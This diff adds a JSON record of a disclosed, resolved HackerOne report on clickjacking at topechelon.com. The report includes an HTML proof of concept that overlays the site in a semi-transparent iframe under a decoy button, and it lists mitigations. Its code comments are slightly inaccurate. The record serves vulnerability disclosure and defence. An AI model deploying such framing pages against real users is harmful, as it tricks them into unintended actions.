@@ -1,0 +1,128 @@
+{
+  "id": 2964441,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTY0NDQx",
+  "url": "https://hackerone.com/reports/2964441",
+  "title": "Clickjacking in main domain https://topechelon.com/",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2025-01-29T13:57:32.845Z",
+  "submitted_at": "2025-01-29T13:57:33.227Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "genz-1",
+    "url": "/genz-1",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 41357,
+    "url": "https://hackerone.com/top_echelon_software",
+    "handle": "top_echelon_software",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/041/357/dd634c95f35ea6225151c570fef8ab43e90c4cb8_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/041/357/dd634c95f35ea6225151c570fef8ab43e90c4cb8_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Top Echelon Software",
+      "twitter_handle": "",
+      "website": "https://www.topechelon.com",
+      "about": "https://www.topechelon.com/about/"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-02-10T13:17:10.542Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-01-31T04:06:10.136Z",
+  "team_member_agreed_on_going_public_at": "2025-02-10T13:17:10.232Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## **Summary:**  \nThe target website is vulnerable to Clickjacking, a web-based attack that tricks users into interacting with a hidden or disguised iframe. Attackers can exploit this vulnerability to manipulate user actions, potentially leading to unauthorized activities such as unintended clicks, form submissions, or credential theft.  \n\n## **Steps to Reproduce:**  \n1. **Create an HTML page** embedding the target website using an `<iframe>`.  \n2. **Modify CSS** to make the iframe transparent or overlay it with deceptive UI elements.  \n3. **Host the HTML page** and trick users into interacting with it.  \n\n## **Proof of Concept (PoC):**  \n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"UTF-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n<title>Clickjacking PoC</title>\n<style>\n    iframe {\n        position: absolute;\n        top: 0;\n        left: 0;\n        width: 100%;\n        height: 100%;\n        opacity: 0.6; /* Makes the iframe invisible */\n        z-index: 99;\n    }\n\n    button {\n        z-index: 100;\n        top:400px;\n        position: relative;\n    }\n    h1 {\n        top: 300px;\n        position: relative;\n\n    }\n</style>\n</head>\n<body>\n<h1>Click the button for a surprise!</h1>\n<button onclick=\"alert('Surprise!')\">Click Me!</button>\n\n<!-- Invisible iframe targeting the account deletion URL -->\n<iframe id=\"target-frame\" src=\"https://topechelon.com/\" frameborder=\"0\"></iframe>\n\n<script>\n    \n    document.getElementById('target-frame').onload = function() {\n        \n        console.log('Iframe has loaded, ready for clickjacking.');\n    };\n</script>\n</body>\n</html>\n```\n{F4001108}\n\n## Impact\n\n- **User Account Takeover:** If a logged-in user interacts with the iframe, attackers could force unintended actions.  \n- **Phishing Attacks:** Users may unknowingly enter sensitive credentials.  \n- **Malicious Actions:** Attackers can exploit user interactions to modify settings, submit forms, or perform other unintended operations.  \n\n## **Recommended Mitigation:**  \nTo prevent Clickjacking attacks, implement the following security measures:  \n\n1. **Use the X-Frame-Options HTTP Header:**  \n   - `X-Frame-Options: DENY` (Prevents embedding in iframes).  \n   - `X-Frame-Options: SAMEORIGIN` (Allows iframes only from the same domain).  \n\n2. **Use Content Security Policy (CSP) Frame-Ancestors Directive:**  \n   - `Content-Security-Policy: frame-ancestors 'self'`  \n\n3. **JavaScript-Based Frame Busting (as an additional security measure):**  \n   ```javascript\n   if (window.top !== window.self) {\n       window.top.location = window.self.location;\n   }",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 4001108,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8oez30rl5b62z5hxpubdf3nltsaz?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4XVEC7DX%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150218Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJIMEYCIQDV4%2BChPJM%2B8PNFbk5eceTQs%2BQtJY1UdHgd5V2A6x0KBwIhAOD%2FNh9VfSICps7HrjJ2P3uuHh2t5atU%2BC%2B0GfFC%2FnveKroFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgwzqnWBEKpx6gntddQqjgVETUn%2Ff0bvFQFYh4RXQ2%2FI4OnAtmZPxVf2cYaUTuS0zqaSFwGGRxqezLpUJeG0w0OA%2BDZglchPkJrl84dtG8%2B6T3FAZFRRXZ2suv7jT%2F5JHYuNpRr8F7DfmXWtKf9tLQggPs%2Bf5kmpm%2BXgMdFwre9skaKv4LZBiDGs%2Bw2TZp3kH1XeDuRSHc2Axh4b4QEG5fDhNSZh0WQvsPWtYIrrsQyPEBPDzPzV2H1tdEel%2BEkJjGzyxAHvQHKmwk1sue%2Bir27ipARMCIq4Xu%2FD%2B80TS4GY014fBhcHqCS8QokbLyYu9qs4sgyf3DE7uSETf1rXrZNHLe8WFhre9ZSoMB9RUDNuTQE%2B5BgNthEzXCspxZSwgR02lHBz9%2FV3qo%2BdbEPNqiz3%2BfZv7yXpJThsbGwNe7WpVwMsn6gk55FpttQdehJ2Or2PRy0aUkUMMvu8Uw52zTLJLVJgGIHSIFgGnJJxgAjzxvlWMKTs2raCEKoG4Q23Xtiz118GyDwnGTavOQcgz57Oiu9wG2Xgm%2BPoUf5mV8QeWCCjocdCw2%2F4i%2BqDJlTAwjECw3LPkJ4WY0RLIhDWC6pfOrSeLfOUQGqtHLb1BJlQe0oUYGoONx%2FTUXlGCLn4XA6FRGebzjUVBwgnAQjQKIkd9Tlq82GtatswcFGxra%2BUvYPJXVUfOW1oqfIhLAOmeh%2FNc%2FKn1x7fh2%2Fg9a5lA9xA5W%2F0sFJr5kTZTQYICxupwXVjkTuISMUdHOUiJKWbzIeTsbLOyX5UJIVn4rSXTciywMtMg%2Bd6n5XBf3Gdin1DHsQYvLuMuuD7GYr03AqQGr01XCrST%2BGpLKwEh8TzAQShHX9uWt8qwABILe9lXvGeDpbISaNnPN%2BCXO4sF1kwv%2F%2F8zwY6sAEF38ohyRoe8KyJy%2FJjsNeK%2B7rd61tF0y%2FCvl62y00Gg7p7oU4b6OpTjqEMJl1c9jrLsaHKR%2BJFlO47gf4gLps%2BjPkhHBZ%2FlyHRO%2FnbilOO%2F7v7h2f2ouJJdopubheJ%2F1afVm8sjNtXl1xAsU8OUfjmTVDzJuwd%2F%2FEbnLRGy9tBB8DWbipxyoo9HxFJxueEf4%2BnK6YWfN6kUYiOCmiS%2Bi%2FF3x2FHUXwRLd6LOEB4hndiw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=37eaaeced7989c083238fa19131e80394508c25e8333744ad02478cf21654b2b",
+      "file_size": 96481,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 79,
+  "voters": [
+    "loaymorad",
+    "terminallogic",
+    "aboalezz",
+    "starlox",
+    "raslanco",
+    "mohaned0101",
+    "thalaivar304",
+    "shubham_srt",
+    "jmo740",
+    "2026",
+    "and 69 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 31913,
+    "asset_type": "URL",
+    "asset_identifier": "www.topechelon.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
